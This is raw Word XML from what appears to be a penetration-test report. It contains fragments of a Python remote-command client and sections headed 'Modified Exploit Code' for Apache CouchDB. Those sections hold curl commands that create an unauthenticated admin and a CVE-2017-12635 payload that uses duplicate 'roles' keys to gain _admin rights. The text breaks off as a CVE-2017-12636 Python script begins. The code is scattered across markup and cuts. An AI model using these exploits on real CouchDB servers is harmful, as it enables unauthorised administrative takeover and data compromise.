      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(1)</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"Authentication successful")</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRPr="002070FF" w:rsidRDefault="002070FF" w:rsidP="002070FF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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"Enter command:\n")</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRPr="002070FF" w:rsidRDefault="002070FF" w:rsidP="002070FF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRPr="002070FF" w:rsidRDefault="002070FF" w:rsidP="002070FF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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 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while True: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if </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&lt;= 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CMD = </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>input(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"&gt; ")</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if not CMD:</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continue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elif</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> CMD == "exit":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sys.exit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(0)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s.send</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>compile_cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(CMD))</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 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>struct.unpack</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">("&gt;I", </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s.recv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(4))[0] # Get data size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s.recv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(45)              # Control message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 45         # Data size without control message</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time.sleep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(0.1)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elif</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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&lt; 1024:        </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data = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s.recv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</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"S---</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%d, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>data_recv_size</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: %d" %(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>data_size,len</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(data)))</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time.sleep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(0.1)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print(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>data.decode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>())</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 0</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else:        </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data = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s.recv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(1024)</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gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>print(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"L---</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%d, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>data_recv_size</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: %d" %(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>data_size,len</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(data)))</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proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>time.sleep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(0.1)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRP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print(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>data.decode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(),end = '')</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRDefault="002070FF" w:rsidP="002070FF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>data_size</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> -= 1024</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRDefault="002070FF" w:rsidP="002070FF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003B6308" w:rsidRPr="002070FF" w:rsidRDefault="003B6308" w:rsidP="003B6308">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="28" w:name="_Toc143392751"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Modified Exploit Code </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>For</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="007739C0">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Unauthenticated Administrative Access</w:t>
      </w:r>
      <w:bookmarkEnd w:id="28"/>
    </w:p>
    <w:p w:rsidR="003B6308" w:rsidRDefault="003B6308" w:rsidP="002070FF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003B6308" w:rsidRDefault="003B6308" w:rsidP="002070FF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRPr="002070FF" w:rsidRDefault="00944875">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRDefault="002070FF" w:rsidP="002070FF">
      <w:r w:rsidRPr="002070FF">
        <w:t>curl -X PUT http://</w:t>
      </w:r>
      <w:r>
        <w:t>10.10.10.10</w:t>
      </w:r>
      <w:r w:rsidRPr="002070FF">
        <w:t>:5984/_config/admins/admin -d '"admin"'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRDefault="002070FF" w:rsidP="002070FF"/>
    <w:p w:rsidR="003B6308" w:rsidRPr="002070FF" w:rsidRDefault="003B6308" w:rsidP="003B6308">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="29" w:name="_Toc143392752"/>
      <w:r>
        <w:t xml:space="preserve">Modified Exploit Code </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>For</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="003B6308">
        <w:t>CVE-2017-12635</w:t>
      </w:r>
      <w:bookmarkEnd w:id="29"/>
    </w:p>
    <w:p w:rsidR="003B6308" w:rsidRDefault="003B6308" w:rsidP="002070FF"/>
    <w:p w:rsidR="003B6308" w:rsidRDefault="003B6308" w:rsidP="002070FF"/>
    <w:p w:rsidR="002070FF" w:rsidRPr="002070FF" w:rsidRDefault="002070FF" w:rsidP="002070FF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>curl -X PUT http://</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>10.10.10.10</w:t>
      </w:r>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:5984/_users/org.couchdb.user:guest \</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRPr="002070FF" w:rsidRDefault="002070FF" w:rsidP="002070FF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">    -H "Accept: application/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>" \</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRPr="002070FF" w:rsidRDefault="002070FF" w:rsidP="002070FF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">    -H "Content-Type: application/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>" \</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRDefault="002070FF" w:rsidP="002070FF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">    -d '{"name": "guest", "password": "guest", "roles": ["_admin"], "roles": [], "type": "user"}'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B935B8" w:rsidRDefault="00B935B8" w:rsidP="002070FF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003B6308" w:rsidRPr="002070FF" w:rsidRDefault="003B6308" w:rsidP="003B6308">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="30" w:name="_Toc143392753"/>
      <w:r>
        <w:t xml:space="preserve">Modified Exploit Code </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>For</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> CVE-2017-12636</w:t>
      </w:r>
      <w:bookmarkEnd w:id="30"/>
    </w:p>
    <w:p w:rsidR="003B6308" w:rsidRDefault="003B6308" w:rsidP="00B935B8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003B6308" w:rsidRDefault="003B6308" w:rsidP="00B935B8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B935B8" w:rsidRPr="00B935B8" w:rsidRDefault="00B935B8" w:rsidP="00B935B8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#!/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/bin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>env</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> python3</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import requests</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import </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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import base64</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from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
